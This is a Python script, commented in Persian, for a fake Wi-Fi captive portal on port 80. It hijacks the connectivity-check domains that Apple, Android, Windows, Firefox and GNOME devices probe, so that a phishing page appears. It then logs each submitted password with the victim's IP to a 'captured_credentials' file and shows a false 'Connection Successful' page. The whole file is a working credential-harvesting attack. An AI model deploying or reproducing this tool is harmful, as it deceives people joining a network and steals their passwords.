#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import os
import sys
from datetime import datetime

def get_unique_logfile(base_name="captured_credentials", ext=".log"):
    """یافتن نام فایل منحصربه‌فرد برای لاگ"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    base_path = os.path.join(script_dir, base_name)
    full_path = base_path + ext

    if not os.path.exists(full_path):
        return full_path

    counter = 2
    while True:
        new_path = f"{base_path}({counter}){ext}"
        if not os.path.exists(new_path):
            return new_path
        counter += 1

# ✅ این خط جدید: تعیین نام فایل منحصربه‌فرد
LOG_FILE = get_unique_logfile()

def log_and_print(ip, password):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] IP: {ip} | Password: {password}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(entry)
    print(f"\033[92m✅ NEW ENTRY → IP: {ip} | Password: {password}\033[0m", flush=True)

# --- بقیه کد کاملاً بدون تغییر ---
class CaptivePortalHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        host = self.headers.get('Host', '').lower()

        captive_domains = [
            'captive.apple.com',
            'connectivitycheck.gstatic.com',
            'connectivitycheck.android.com',
            'msftconnecttest.com',
            'www.msftconnecttest.com',
            'detectportal.firefox.com',
            'nmcheck.gnome.org'
        ]

        if any(domain in host for domain in captive_domains):
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/")
            self.end_headers()
            return

        if self.path.startswith('/login') or '?' in self.path:
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            password = params.get('password', [''])[0].strip()
            if password:
                log_and_print(client_ip, password)
                self.send_response(200)
                self.send_header("Content-type", "text/html; charset=utf-8")
                self.end_headers()
                success_page = '''
                <!DOCTYPE html>
                <html>
                <head><meta charset="UTF-8"><title>Connected</title></head>
                <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
                    <h2>✅ Connection Successful</h2>
                    <p>You are now connected to the internet.</p>
                </body>
                </html>
                '''
                self.wfile.write(success_page.encode('utf-8'))
                return

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        try:
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.wfile.write(b"<h1>500: index.html not found</h1>")

    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)

    # ایجاد فایل جدید (منحصربه‌فرد)
    open(LOG_FILE, "a").close()
    os.chmod(LOG_FILE, 0o666)

    print(f"🚀 Captive Portal is running on http://10.0.0.1")
    print(f"📁 Log file: {LOG_FILE}")
    print("👀 Watching for credentials...\n")

    try:
        with socketserver.TCPServer(("", 80), CaptivePortalHandler) as httpd:
            httpd.serve_forever()
    except PermissionError:
        print("❌ Error: Cannot bind to port 80. Run with sudo!", file=sys.stderr)
        sys.exit(1)
    except OSError as e:
        if e.errno == 98:
            print("❌ Error: Port 80 is already in use.", file=sys.stderr)
        else:
            print(f"❌ Server error: {e}", file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n🛑 Server stopped.")
        sys.exit(0)
